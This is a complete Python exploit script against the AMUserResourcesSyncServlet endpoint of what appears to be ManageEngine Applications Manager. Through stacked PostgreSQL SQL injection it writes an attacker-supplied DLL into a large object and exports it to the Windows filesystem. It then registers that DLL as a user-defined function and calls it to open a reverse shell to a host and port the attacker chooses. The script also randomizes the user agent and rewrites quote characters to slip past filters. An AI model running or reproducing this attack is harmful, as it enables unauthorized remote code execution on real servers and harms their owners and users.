#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import base64
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

def encode_payload(raw_payload,encoding):
    # Read payload from file and base64 encode
    with open(raw_payload, 'rb') as f:
        if encoding == 'base64':
            b64_bytes = base64.b64encode(f.read())
            payload = b64_bytes.decode('utf-8')
        elif encoding == 'hex':
            payload = f.read().hex()
    return payload

def sanitize_string(inj_str):
    # Print original and modified query string
    print("\n[*] Original injection string:\n" + inj_str)
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
    print("[*] Regex modified injection string:\n" + inj_regex_str)
    print("\n")
    return inj_regex_str

def delete_lo(loid):
    print("[*] Deleting existing LO...")
    sql = "select lo_unlink(" + str(loid) + ")"
    return sql

def create_lo(loid):
    print("[*] Creating LO for UDF injection...")
    sql = "select lo_create(" + str(loid) + ")"
    return sql

def inject_udf(loid,payload,encoding,chunk,url,params,headers):
    print("[*] Injecting " + encoding + " encoded payload of length " + str(len(payload)) + " into LO...")
    print("[*] Payload: " + str(payload))
    rounded = round(len(payload) / chunk) + 1           # +1 due to stupid Python 3 handling of rounding
    print("[*] Injecting " + str(rounded) + " times of chunklength of " + str(chunk) + "...")

    for i in range(0, int(rounded)):
        start_chunk = i * chunk
        end_chunk = start_chunk + chunk
        payload_chunk = payload[start_chunk:end_chunk]
        sql = "insert into pg_largeobject (loid, pageno, data) values (" + str(loid) + "," + str(i) + ",decode('" + payload_chunk + "','" + encoding + "'))"
        create_request(url,params,sql,headers)

def export_udf(loid,write_path_file):
    print("[*] Exporting UDF library to filesystem...")
    sql = "select lo_export(" + str(loid) + ", '" + write_path_file + "')"
    return sql

def create_udf_func(write_path_file):
    print("[*] Creating function...")
    sql = "create or replace function hodor_revshell(text,integer) returns void as '" + write_path_file + "', 'connect_back' language c strict"
    return sql

def trigger_udf(revhost,revport):
    print("[*] Launching reverse shell via UDF...")
    sql = "select hodor_revshell('" + revhost + "', " + str(revport) + ")"
    return sql

def create_request(url,params,inj_str,headers):
    prefix = ";"
    suffix = ";-- "
    sqli = sanitize_string(prefix + inj_str + suffix)
    r = requests.get(url,params=params + sqli,headers=headers,verify=False)
    return r

# Main
def main(argv):
    if len(sys.argv) == 6:
        host = sys.argv[1]
        revhost = sys.argv[2]
        revport = sys.argv[3]
        encoding = sys.argv[4]
        payl = sys.argv[5]
    else:
        print("[*] Usage: " + sys.argv[0] + " <host> <reverse_shell_host> <reverse_shell_port> <encoding_base64-or-hex> <payload_file>")
        print("[*] Example: " + sys.argv[0] + " https://192.168.252.12:8443 192.168.252.14 6969 hex rev_shell.dll\n")
        exit(0)
    
    # Check variable of entered encoding
    if (encoding != "base64" and encoding != "hex"):
        print("[!] Encoding needs to be hex or base64\n")
        exit(-1)

    # Check to see if it is a file to read as an argument
    if os.path.isfile(payl):
        # File exists and keep going
        payload = encode_payload(payl,encoding)
    else:
        # Print error and bail, file not there
        print("[!] The following file does not exist: " + payl + "\n")
        exit(-1)

    # HTTP Headers
    headers = http_headers()

    # Variables
    urlpage = "/servlet/AMUserResourcesSyncServlet"
    url = host + urlpage
    params = "ForMasRange=1&userId=1"
    loid = 1337
    write_path_file = "c:\\users\\public\\rev_shell.dll"
    chunk = 4096

    # Do stuff
    try:
        # Delete LO
        create_request(url,params,delete_lo(loid),headers)
        # Create LO
        create_request(url,params,create_lo(loid),headers)
        # Inject UDF
        inject_udf(loid,payload,encoding,chunk,url,params,headers)
        # Export UDF
        create_request(url,params,export_udf(loid,write_path_file),headers)
        # Create UDF
        create_request(url,params,create_udf_func(write_path_file),headers)
        # Trigger UDF
        create_request(url,params,trigger_udf(revhost,revport),headers)

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
